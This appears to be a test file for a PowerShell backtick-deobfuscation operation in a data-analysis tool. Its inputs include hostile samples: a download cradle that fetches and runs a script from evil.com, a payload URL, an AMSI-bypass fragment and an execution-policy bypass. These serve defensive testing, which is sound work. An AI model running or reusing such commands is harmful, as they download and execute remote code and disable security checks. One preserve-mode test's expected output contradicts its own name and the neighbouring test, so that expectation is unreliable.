/**
 * PowerShell Backtick Remove tests
 *
 * @author vigneshrajan94
 * @copyright Crown Copyright 2026
 * @license Apache-2.0
 */
import TestRegister from "../../lib/TestRegister.mjs";

TestRegister.addTests([
    {
        "name": "PowerShell Backtick Remove: basic keyword deobfuscation",
        "input": "In`voke-Ex`pression",
        "expectedOutput": "Invoke-Expression",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: IEX alias",
        "input": "I`E`X",
        "expectedOutput": "IEX",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: New-Object",
        "input": "Ne`w-O`bje`ct",
        "expectedOutput": "New-Object",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: multiple keywords on one line",
        "input": "I`EX (N`ew-O`bject N`et.W`ebC`lient).Do`wnlo`adStr`ing($url)",
        "expectedOutput": "IEX (New-Object Net.WebClient).DownloadString($url)",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: default strips all backticks including `n",
        "input": "Write-Host `\"Hello`nWorld`\"",
        "expectedOutput": "Write-Host \"HellonWorld\"",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [false] }]
    },
    {
        "name": "PowerShell Backtick Remove: preserve mode keeps `n escape sequence",
        "input": "Write-Host `\"Hello`nWorld`\"",
        "expectedOutput": "Write-Host `\"Hello`nWorld`\"",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [true] }]
    },
    {
        "name": "PowerShell Backtick Remove: preserve mode keeps `t tab escape",
        "input": "col1`tcol2`tcol3",
        "expectedOutput": "col1`tcol2`tcol3",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [true] }]
    },
    {
        "name": "PowerShell Backtick Remove: preserve mode keeps `\" and `' escapes",
        "input": "\"He said `\"hello`\"\"",
        "expectedOutput": "\"He said `\"hello`\"\"",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [true] }]
    },
    {
        "name": "PowerShell Backtick Remove: preserve mode keeps `$ to suppress variable expansion",
        "input": "Write-Host `$notAVariable",
        "expectedOutput": "Write-Host `$notAVariable",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [true] }]
    },
    {
        "name": "PowerShell Backtick Remove: preserve mode keeps `` literal backtick escape",
        "input": "Write-Host ``",
        "expectedOutput": "Write-Host ``",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [true] }]
    },
    {
        "name": "PowerShell Backtick Remove: preserve mode strips obfuscation but keeps escapes",
        "input": "Inv`oke`-Ex`pression `\"Hello`nWorld`\"",
        "expectedOutput": "Invoke-Expression `\"Hello`nWorld`\"",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [true] }]
    },
    {
        "name": "PowerShell Backtick Remove: empty input",
        "input": "",
        "expectedOutput": "",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: no backticks — passthrough",
        "input": "Invoke-Expression $cmd",
        "expectedOutput": "Invoke-Expression $cmd",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: AMSI bypass pattern",
        "input": "[Re`f].A`ss`em`bl`y.G`etT`yp`e('S`yst`em.M`an`ag`em`en`t.A`ut`om`at`io`n.A`ms`iU`ti`ls')",
        "expectedOutput": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: digits after backtick are removed (not special)",
        "input": "Write`1-Host",
        "expectedOutput": "Write1-Host",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: download cradle with backtick New-Object and WebClient",
        "input": "i`ex(Ne`w-Ob`ject N`et.W`ebCl`ient).D`ownl`oadStr`ing('http://evil.com/a.ps1')",
        "expectedOutput": "iex(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: Set-ExecutionPolicy bypass split by backticks",
        "input": "S`et-Ex`ecut`ionP`oli`cy By`pass -S`cop`e Pr`oces`s",
        "expectedOutput": "Set-ExecutionPolicy Bypass -Scope Process",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: backtick inside URL string",
        "input": "htt`p://19`2.168.1.1/pa`yload.ps1",
        "expectedOutput": "http://192.168.1.1/payload.ps1",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: trailing backtick with no following char removed",
        "input": "Get-Process`",
        "expectedOutput": "Get-Process",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [] }]
    },
    {
        "name": "PowerShell Backtick Remove: preserve mode strips `P `o obfuscation, keeps `n and `\"",
        "input": "Get-`Pr`ocess `\"Hello`nWorld`\"",
        "expectedOutput": "Get-`Pr`ocess `\"Hello`nWorld`\"",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [true] }]
    },
    {
        "name": "PowerShell Backtick Remove: preserve mode strips obfuscation, keeps `$ suppressor",
        "input": "Get-`Pr`ocess `$notVar",
        "expectedOutput": "Get-Process `$notVar",
        "recipeConfig": [{ "op": "PowerShell Backtick Remove", "args": [true] }]
    }
]);
